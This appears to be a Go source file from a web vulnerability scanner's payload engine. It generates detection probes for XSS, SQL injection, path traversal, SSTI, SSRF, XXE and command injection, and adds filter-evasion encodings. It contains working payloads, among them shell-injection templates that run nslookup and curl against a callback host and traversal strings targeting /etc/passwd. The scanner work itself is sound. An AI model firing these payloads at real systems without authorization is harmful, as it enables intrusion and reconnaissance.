// Package payload is VulnForge's blackbox payload engine: a catalog of
// non-destructive probes for common web vulnerability classes, a small set
// of context-aware mutations/encodings, and an injection-point abstraction
// so the same payload can be placed into a query parameter, a form field, a
// JSON body field, a header, or a path segment.
//
// Every payload here is a detection probe, not an exploit: XSS payloads
// only alert/call back, SQLi probes only alter query truth-values or
// trigger syntax errors, path-traversal probes only read well-known
// benign files, and anything requiring out-of-band confirmation uses a
// unique per-attempt canary/token (see internal/oob) rather than a
// destructive side effect. Callers remain responsible for gating active
// payload delivery behind an explicit "active scan" opt-in and an
// authorized scope.
package payload

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"net/url"
	"strings"
)

// Class identifies a vulnerability class a payload probes for.
type Class string

const (
	ClassXSSReflected     Class = "xss.reflected"
	ClassSQLiError        Class = "sqli.error_based"
	ClassSQLiBoolean      Class = "sqli.boolean_based"
	ClassSQLiTimeBased    Class = "sqli.time_based"
	ClassOpenRedirect     Class = "open_redirect"
	ClassPathTraversal    Class = "path_traversal"
	ClassSSTI             Class = "ssti"
	ClassSSRFOOB          Class = "ssrf.oob"
	ClassCommandInjOOB    Class = "command_injection.oob"
	ClassCRLFInjection    Class = "crlf_injection"
	ClassXXEOOB           Class = "xxe.oob"
	ClassHostHeaderInject Class = "host_header_injection"
)

// PointKind is the kind of location a payload value is placed into.
type PointKind string

const (
	PointQuery  PointKind = "query"
	PointForm   PointKind = "form"
	PointJSON   PointKind = "json"
	PointHeader PointKind = "header"
	PointPath   PointKind = "path"
	PointCookie PointKind = "cookie"
)

// InjectionPoint identifies a single place within a request where a value
// can be substituted: a query/form/cookie parameter name, a JSON field
// path (dot-separated, e.g. "user.search"), a header name, or a path
// segment index for PointPath.
type InjectionPoint struct {
	Kind         PointKind
	Name         string // parameter/header/JSON-field name; unused for PointPath
	PathSegment  int    // index into the URL path segments; only for PointPath
	OriginalPath string // the unmodified request path; only for PointPath
}

// String renders a human-/report-readable identifier, e.g. "query:search"
// or "json:user.search" — this is what's stored as Finding evidence's
// InjectionPoint field.
func (p InjectionPoint) String() string {
	if p.Kind == PointPath {
		return fmt.Sprintf("path[%d]", p.PathSegment)
	}
	return string(p.Kind) + ":" + p.Name
}

// Attempt is one concrete payload value to try at one InjectionPoint, with
// everything needed to detect success and to correlate an out-of-band
// callback back to this specific attempt.
type Attempt struct {
	Class    Class
	Point    InjectionPoint
	Value    string // the literal string to place at Point
	Canary   string // a unique marker (reflection probes): look for this exact string in the response
	OOBToken string // a unique token (blind/OOB probes): look for this token's interaction in the OOB listener
	// Context hints how the value will land in an HTML response, used to
	// pick an XSS sub-variant; empty for non-XSS classes.
	Context HTMLContext
}

// HTMLContext describes where a reflected value lands in an HTML document,
// since that changes which characters actually need to be broken out of.
type HTMLContext string

const (
	ContextUnknown     HTMLContext = ""
	ContextHTMLBody    HTMLContext = "html_body"
	ContextHTMLAttr    HTMLContext = "html_attribute"
	ContextJSString    HTMLContext = "js_string"
	ContextURLParam    HTMLContext = "url_param"
	ContextHTMLComment HTMLContext = "html_comment"
)

// Engine generates Attempts for a given InjectionPoint. It is stateless
// apart from the random source used for canaries/tokens.
type Engine struct {
	// OOBCallbackHost, if set, is used to build OOB-style payload values
	// (e.g. for SSRF/XXE/command-injection probes) as
	// "<token>.<OOBCallbackHost>". If empty, OOB-class generators are
	// skipped by GenerateAll (callers can still call them directly with a
	// manually supplied host).
	OOBCallbackHost string
}

// NewToken returns a random lowercase-hex token suitable as a unique
// per-attempt canary or OOB subdomain label (DNS labels are case-insensitive
// and limited in charset, so hex is used rather than base64).
func NewToken(n int) (string, error) {
	if n <= 0 {
		n = 8
	}
	buf := make([]byte, n)
	if _, err := rand.Read(buf); err != nil {
		return "", fmt.Errorf("payload: generating token: %w", err)
	}
	return hex.EncodeToString(buf), nil
}

// mustToken panics only on an exhausted entropy source, which in practice
// means crypto/rand is broken; callers that can propagate an error should
// use NewToken directly instead.
func mustToken(n int) string {
	t, err := NewToken(n)
	if err != nil {
		// crypto/rand failing is a fatal environment problem; callers of the
		// convenience generators below accept this tradeoff for ergonomics.
		panic(err)
	}
	return t
}

// ReflectedXSS returns detection-only XSS attempts for the given point and
// HTML context. Each payload both uses a unique canary substring (for
// contexts where script execution can't be observed directly, e.g. a
// static HTML diff) and is constructed so that, if reflected unescaped, it
// would demonstrate script-context breakout.
func (e Engine) ReflectedXSS(point InjectionPoint, ctx HTMLContext) []Attempt {
	canary := "vfxss" + mustToken(6)
	variants := map[HTMLContext][]string{
		ContextHTMLBody: {
			fmt.Sprintf("<script>/*%s*/</script>", canary),
			fmt.Sprintf("<img src=x onerror=/*%s*/1>", canary),
		},
		ContextHTMLAttr: {
			fmt.Sprintf(`"><script>/*%s*/</script>`, canary),
			fmt.Sprintf(`" onmouseover=/*%s*/1 x="`, canary),
		},
		ContextJSString: {
			fmt.Sprintf(`';/*%s*/;'`, canary),
			fmt.Sprintf(`</script><script>/*%s*/</script>`, canary),
		},
		ContextURLParam: {
			fmt.Sprintf("javascript:/*%s*/alert(1)", canary),
		},
		ContextHTMLComment: {
			fmt.Sprintf("--><script>/*%s*/</script><!--", canary),
		},
	}
	values, ok := variants[ctx]
	if !ok {
		// Unknown context: try the generic, most broadly effective probe.
		values = variants[ContextHTMLBody]
	}
	out := make([]Attempt, 0, len(values))
	for _, v := range values {
		out = append(out, Attempt{
			Class:   ClassXSSReflected,
			Point:   point,
			Value:   v,
			Canary:  canary,
			Context: ctx,
		})
	}
	return out
}

// SQLiErrorBased returns probes intended to trigger a database error
// message when the value is concatenated unsanitized into a query. They
// never attempt to modify data (no INSERT/UPDATE/DELETE/DROP payloads).
func (e Engine) SQLiErrorBased(point InjectionPoint) []Attempt {
	values := []string{
		`'`,
		`"`,
		`')`,
		`" OR "1"="1`,
	}
	return attemptsFor(ClassSQLiError, point, values)
}

// SQLiBooleanBased returns a true/false pair; the caller compares the two
// responses (length/status/hash) to detect a boolean-blind condition. Index
// 0 is the "true" probe, index 1 is the matching "false" probe — callers
// must send both and compare, never flag on either alone.
func (e Engine) SQLiBooleanBased(point InjectionPoint, baseValue string) (trueAttempt, falseAttempt Attempt) {
	trueAttempt = Attempt{
		Class: ClassSQLiBoolean,
		Point: point,
		Value: baseValue + "' OR '1'='1",
	}
	falseAttempt = Attempt{
		Class: ClassSQLiBoolean,
		Point: point,
		Value: baseValue + "' AND '1'='2",
	}
	return trueAttempt, falseAttempt
}

// SQLiTimeBased returns a time-based blind probe for the given DB family.
// This class is intentionally not included in GenerateAll: it causes the
// backend to sleep, so callers must gate it behind an explicit flag and a
// strict per-target concurrency/rate budget even in active mode.
func (e Engine) SQLiTimeBased(point InjectionPoint, delaySeconds int) []Attempt {
	if delaySeconds <= 0 {
		delaySeconds = 5
	}
	values := []string{
		fmt.Sprintf("' AND SLEEP(%d)-- -", delaySeconds),                           // MySQL
		fmt.Sprintf("'; SELECT PG_SLEEP(%d)-- -", delaySeconds),                    // PostgreSQL
		fmt.Sprintf("' WAITFOR DELAY '0:0:%d'-- -", delaySeconds),                  // MSSQL
		fmt.Sprintf("' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',%d)-- -", delaySeconds), // Oracle
	}
	return attemptsFor(ClassSQLiTimeBased, point, values)
}

// OpenRedirect returns probes pointing at an obviously external, harmless
// marker host so a redirect-location check can confirm unsanitized
// forwarding without actually sending a target anywhere sensitive.
func (e Engine) OpenRedirect(point InjectionPoint, markerHost string) []Attempt {
	if markerHost == "" {
		markerHost = "vulnforge-redirect-check.invalid"
	}
	values := []string{
		"https://" + markerHost + "/",
		"//" + markerHost + "/",
		"/\\" + markerHost + "/",
		"https:" + markerHost,
	}
	return attemptsFor(ClassOpenRedirect, point, values)
}

// PathTraversal returns probes that only ever request well-known, benign
// files (never attempt to write, and never target absolute paths outside
// typical OS layout markers used purely to prove traversal).
func (e Engine) PathTraversal(point InjectionPoint) []Attempt {
	values := []string{
		"../../../../../../etc/passwd",
		"..%2f..%2f..%2f..%2fetc%2fpasswd",
		"....//....//....//etc/passwd",
		`..\..\..\..\windows\win.ini`,
	}
	return attemptsFor(ClassPathTraversal, point, values)
}

// SSTI returns arithmetic server-side template injection probes. Detection
// is purely by checking whether the engine evaluated the arithmetic (e.g.
// "49" appearing in the response for "{{7*7}}"), never by achieving code
// execution.
func (e Engine) SSTI(point InjectionPoint) []Attempt {
	values := []string{
		"{{7*7}}",    // Jinja2/Twig
		"${7*7}",     // various EL/FreeMarker-like
		"#{7*7}",     // Ruby ERB-like
		"<%= 7*7 %>", // ERB
		"*{7*7}",     // Thymeleaf
	}
	return attemptsFor(ClassSSTI, point, values)
}

// CRLFInjection returns header/response-splitting probes using a unique
// canary header name so success can be detected by its exact presence in
// the raw response headers, not by any content guess.
func (e Engine) CRLFInjection(point InjectionPoint) []Attempt {
	canary := "X-Vulnforge-Crlf-" + mustToken(4)
	value := fmt.Sprintf("test\r\n%s: 1", canary)
	return []Attempt{{Class: ClassCRLFInjection, Point: point, Value: value, Canary: canary}}
}

// HostHeaderInjection returns probes that substitute the Host header (or an
// X-Forwarded-Host override) with a unique canary host, to detect
// password-reset-poisoning-style trust of client-supplied host values.
func (e Engine) HostHeaderInjection() []Attempt {
	canary := mustToken(6) + ".vulnforge-host-check.invalid"
	return []Attempt{
		{Class: ClassHostHeaderInject, Point: InjectionPoint{Kind: PointHeader, Name: "Host"}, Value: canary, Canary: canary},
		{Class: ClassHostHeaderInject, Point: InjectionPoint{Kind: PointHeader, Name: "X-Forwarded-Host"}, Value: canary, Canary: canary},
	}
}

// SSRFOutOfBand returns a probe whose value is a unique OOB callback URL;
// the caller must check the OOB listener (internal/oob) for an interaction
// on Attempt.OOBToken, not the HTTP response, since a successful SSRF often
// produces no visible difference in-band.
func (e Engine) SSRFOutOfBand(point InjectionPoint, oobHost string) (Attempt, error) {
	if oobHost == "" {
		return Attempt{}, fmt.Errorf("payload: SSRFOutOfBand requires a non-empty OOB callback host")
	}
	token, err := NewToken(10)
	if err != nil {
		return Attempt{}, err
	}
	value := fmt.Sprintf("http://%s.%s/", token, oobHost)
	return Attempt{Class: ClassSSRFOOB, Point: point, Value: value, OOBToken: token}, nil
}

// XXEOutOfBand returns a minimal external-entity XML document that, if
// parsed with external entities enabled, causes an out-of-band HTTP
// request to the callback host. It performs no local file read: the entity
// resolves directly to the callback URL, keeping the probe non-destructive.
func (e Engine) XXEOutOfBand(point InjectionPoint, oobHost string) (Attempt, error) {
	if oobHost == "" {
		return Attempt{}, fmt.Errorf("payload: XXEOutOfBand requires a non-empty OOB callback host")
	}
	token, err := NewToken(10)
	if err != nil {
		return Attempt{}, err
	}
	callback := fmt.Sprintf("http://%s.%s/xxe", token, oobHost)
	value := fmt.Sprintf(`<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "%s">]><r>&x;</r>`, callback)
	return Attempt{Class: ClassXXEOOB, Point: point, Value: value, OOBToken: token}, nil
}

// CommandInjectionOutOfBand returns shell-metacharacter probes that only
// trigger a DNS/HTTP callback (e.g. `nslookup`/`curl` of the OOB host) and
// never perform a destructive or state-changing action.
func (e Engine) CommandInjectionOutOfBand(point InjectionPoint, oobHost string) ([]Attempt, error) {
	if oobHost == "" {
		return nil, fmt.Errorf("payload: CommandInjectionOutOfBand requires a non-empty OOB callback host")
	}
	token, err := NewToken(10)
	if err != nil {
		return nil, err
	}
	host := token + "." + oobHost
	templates := []string{
		"; nslookup %s #",
		"| nslookup %s",
		"` nslookup %s `",
		"$(nslookup %s)",
		"&& curl http://%s/",
	}
	out := make([]Attempt, 0, len(templates))
	for _, t := range templates {
		out = append(out, Attempt{
			Class:    ClassCommandInjOOB,
			Point:    point,
			Value:    fmt.Sprintf(t, host),
			OOBToken: token,
		})
	}
	return out, nil
}

// GenerateAll returns the standard, non-destructive, in-band-detectable
// probe set for a given point and HTML context, excluding classes that
// require an OOB host or an explicit time-based opt-in. It's the default
// set used by passive-safe "active" scanning.
func (e Engine) GenerateAll(point InjectionPoint, ctx HTMLContext) []Attempt {
	var out []Attempt
	out = append(out, e.ReflectedXSS(point, ctx)...)
	out = append(out, e.SQLiErrorBased(point)...)
	out = append(out, e.OpenRedirect(point, "")...)
	out = append(out, e.PathTraversal(point)...)
	out = append(out, e.SSTI(point)...)
	out = append(out, e.CRLFInjection(point)...)
	if e.OOBCallbackHost != "" {
		if a, err := e.SSRFOutOfBand(point, e.OOBCallbackHost); err == nil {
			out = append(out, a)
		}
	}
	return out
}

func attemptsFor(class Class, point InjectionPoint, values []string) []Attempt {
	out := make([]Attempt, 0, len(values))
	for _, v := range values {
		out = append(out, Attempt{Class: class, Point: point, Value: v})
	}
	return out
}

// Mutate applies a named encoding/case mutation to a payload value so the
// same probe can be retried against naive filters. Unknown names return the
// input unchanged.
func Mutate(name, value string) string {
	switch name {
	case "url_encode":
		return url.QueryEscape(value)
	case "double_url_encode":
		return url.QueryEscape(url.QueryEscape(value))
	case "html_entities":
		var sb strings.Builder
		for _, r := range value {
			fmt.Fprintf(&sb, "&#%d;", r)
		}
		return sb.String()
	case "upper_case":
		return strings.ToUpper(value)
	case "null_byte_suffix":
		return value + "%00"
	case "unicode_overlong_slash":
		return strings.ReplaceAll(value, "/", "%c0%af")
	default:
		return value
	}
}

// MutationNames lists the identifiers accepted by Mutate, in a stable order,
// for callers that want to iterate "this payload under every mutation".
func MutationNames() []string {
	return []string{
		"url_encode",
		"double_url_encode",
		"html_entities",
		"upper_case",
		"null_byte_suffix",
		"unicode_overlong_slash",
	}
}

// ReflectsCanary reports whether body contains the exact canary substring
// from an Attempt. Detection logic lives with the engine so the "what
// counts as a hit" definition stays in one place as payloads evolve.
func ReflectsCanary(body string, a Attempt) bool {
	if a.Canary == "" {
		return false
	}
	return strings.Contains(body, a.Canary)
}
